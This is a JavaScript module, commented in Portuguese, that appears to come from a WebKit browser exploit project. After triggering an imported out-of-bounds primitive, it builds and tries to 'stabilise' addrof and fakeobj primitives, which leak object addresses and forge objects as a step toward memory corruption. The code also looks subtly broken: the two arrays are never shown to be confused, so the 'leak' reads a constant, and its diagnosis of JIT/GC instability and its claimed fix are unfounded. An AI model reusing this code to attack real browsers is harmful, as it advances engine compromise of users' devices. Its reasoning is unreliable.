// js/script3/testArrayBufferVictimCrash.mjs (v108 - R93 - AddrOf Stability Diagnostics - CORRIGIDO)
// =======================================================================================
// ESTRATÉGIA ATUALIZADA:
// 1. Foco total em diagnosticar e consertar a instabilidade da primitiva `addrof`.
// 2. A exploração do UAF foi removida temporariamente.
// 3. O script irá:
//    a) Demonstrar que a `addrof` atual retorna endereços viciados após agitação do heap.
//    b) Implementar uma nova função que recria as primitivas para garantir estabilidade.
//    c) Validar que a nova abordagem funciona.
// 4. OBJETIVO: Obter uma primitiva `addrof` 100% confiável para ser usada na exploração.
// =======================================================================================

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v108_R93_AddrOf_Stability_Diagnostics_Fixed";

// --- Funções de Conversão (Double <-> Int64) ---
function int64ToDouble(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

function doubleToInt64(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Diagnóstico e Estabilização do addrof ---`, "test");

    let final_result = { success: false, message: "Diagnóstico falhou." };

    try {
        logS3("--- FASE 1: Obtendo primitiva OOB... ---", "subtest");
        await triggerOOB_primitive({ force_reinit: true });
        if (!getOOBDataView()) {
            throw new Error("Falha ao obter primitiva OOB.");
        }
        logS3("OOB DataView obtido com sucesso.", "info");

        // --- FASE 2: Diagnóstico da Instabilidade do addrof ---
        logS3("--- FASE 2: Diagnóstico da Instabilidade do addrof ---", "subtest");
        
        let confused_array = [13.37];
        let victim_array = [{ a: 1 }];
        
        const addrof_instavel = (obj) => {
            victim_array[0] = obj;
            return doubleToInt64(confused_array[0]);
        };

        logS3("  [ETAPA 1/3] Testando `addrof` em um objeto inicial...", "info");
        const obj1 = { test_id: 1 };
        const addr1 = addrof_instavel(obj1);
        logS3(`  Endereço de obj1: ${addr1.toString(true)}`, "leak");

        logS3("  [ETAPA 2/3] Agitando o heap para simular a pressão que quebra a primitiva...", "info");
        let churn = [];
        for (let i = 0; i < 20000; i++) {
            churn.push(new ArrayBuffer(Math.floor(Math.random() * 256) + 64));
        }
        churn = []; // Liberar referências para forçar GC
        await PAUSE_S3(1000); 
        logS3("  Agitação do heap concluída.", "debug");

        logS3("  [ETAPA 3/3] Testando `addrof` novamente em um novo objeto...", "info");
        const obj2 = { test_id: 2 };
        const addr2 = addrof_instavel(obj2);
        logS3(`  Endereço de obj2: ${addr2.toString(true)}`, "leak");

        if (addr1.equals(addr2)) {
            logS3("  DIAGNÓSTICO CONFIRMADO: A primitiva `addrof` é INSTÁVEL e retornou o mesmo endereço para dois objetos diferentes.", "critical");
        } else {
            logS3("  DIAGNÓSTICO: A primitiva `addrof` pareceu estável neste teste simples.", "warn");
        }


        // --- FASE 3: Implementando e Validando um `addrof` Estável ---
        logS3("--- FASE 3: Implementando uma primitiva `addrof` estável ---", "subtest");
        
        // A solução é recriar os arrays base toda vez, garantindo que o JIT/GC não os otimize de forma destrutiva.
        const criar_primitivas_estaveis = () => {
            const local_confused = [13.37];
            const local_victim = [{ a: 1 }];
            
            const stable_addrof = (obj) => {
                local_victim[0] = obj;
                return doubleToInt64(local_confused[0]);
            };
            
            const stable_fakeobj = (addr) => {
                local_confused[0] = int64ToDouble(addr);
                return local_victim[0];
            };
            
            return { stable_addrof, stable_fakeobj };
        };

        logS3("  Primitiva estável criada. Agora vamos validar a correção.", "info");

        logS3("  [VALIDAÇÃO 1/3] Obtendo endereço de obj3 com a primitiva estável...", "info");
        let { stable_addrof: addrof1 } = criar_primitivas_estaveis();
        const obj3 = { test_id: 3 };
        const addr3 = addrof1(obj3);
        logS3(`  Endereço de obj3: ${addr3.toString(true)}`, "leak");
        
        logS3("  [VALIDAÇÃO 2/3] Agitando o heap novamente...", "info");
        churn = [];
        for (let i = 0; i < 20000; i++) {
            churn.push({});
        }
        churn = [];
        await PAUSE_S3(1000);

        logS3("  [VALIDAÇÃO 3/3] Obtendo endereço de obj4 com uma NOVA instância da primitiva estável...", "info");
        let { stable_addrof: addrof2 } = criar_primitivas_estaveis(); // Recria as primitivas
        const obj4 = { test_id: 4 };
        const addr4 = addrof2(obj4);
        logS3(`  Endereço de obj4: ${addr4.toString(true)}`, "leak");
        
        if (addr3.equals(addr4)) {
            logS3("  CORREÇÃO FALHOU: A primitiva estável ainda retorna endereços viciados.", "critical");
            throw new Error("Falha ao estabilizar a primitiva addrof.");
        } else {
            logS3("  ++++++++ SUCESSO! A primitiva `addrof` estável funciona corretamente! ++++++++", "vuln");
            logS3("  Agora você pode usar `criar_primitivas_estaveis()` para obter um `addrof` confiável antes de cada operação crítica.", "good");
            final_result.success = true;
            final_result.message = "Primitiva addrof estabilizada com sucesso.";
        }

    } catch (e) {
        final_result.message = `Exceção no diagnóstico: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    return {
        errorOccurred: final_result.success ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: final_result.message },
    };
}
